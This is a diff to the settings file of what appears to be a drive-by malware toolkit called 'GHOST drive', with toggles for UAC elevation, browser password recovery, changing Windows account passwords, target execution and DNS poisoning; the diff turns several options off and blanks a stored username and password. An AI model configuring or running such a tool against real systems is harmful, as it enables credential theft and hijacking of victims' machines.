@@ -1,12 +1,12 @@
 # ->initializing controls
 uac_elevation = 0
-duplicate_exec = 1
+duplicate_exec = 0
 stub = "media.txt"
 logging = 0
 
 # ->completion controls
 msgbox = {
-    'controller': 1,
+    'controller': 0,
     'title': "GHOST drive",
     'msg': "Driveby complete",
     'buttons': 0
@@ -18,7 +18,7 @@ power = {
     'timeout': "999"
 }
 
-sound = 1
+sound = 0
 
 # ->password recovery
 browser_pwds = 0
@@ -34,8 +34,8 @@ change_nt_pwd = {
     'current_acc_controller': 0,
     'current_acc_pwd': "",
     'diff_acc_controller': 0,
-    'diff_acc_usr': "Ebrahim",
-    'diff_acc_pwd': "a password"
+    'diff_acc_usr': "",
+    'diff_acc_pwd': ""
 }
 
 # ->reconnaissance
@@ -90,12 +90,12 @@ target_exec = {
 # ->DNS based attacks
 dns_halt = {
     'controller': 0,
-    'clear': 1,
+    'clear': 0,
     'entries': ""
 }
 
 dns_poison = {
     'controller': 0,
-    'clear': 1,
+    'clear': 0,
     'entries': ""
 }
